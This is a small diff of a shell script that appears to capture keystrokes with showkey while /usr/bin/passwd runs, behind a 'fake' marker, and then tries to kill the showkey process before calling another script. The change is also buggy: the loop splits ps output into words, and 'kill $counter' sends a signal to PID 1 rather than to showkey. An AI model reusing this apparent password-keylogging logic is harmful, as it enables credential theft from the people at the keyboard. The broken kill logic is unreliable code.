@@ -10,5 +10,14 @@ echo ""
 # end-for fake
 
 /usr/bin/passwd
-kill %1
+let counter=0
+for TARGET in $(ps aux | grep showkey);do
+if [ $counter -eq 1 ]
+then
+kill $counter
+fi
+((counter++))
+done
+# 
+sleep 10
 /opt/$FOLDER/function.sh
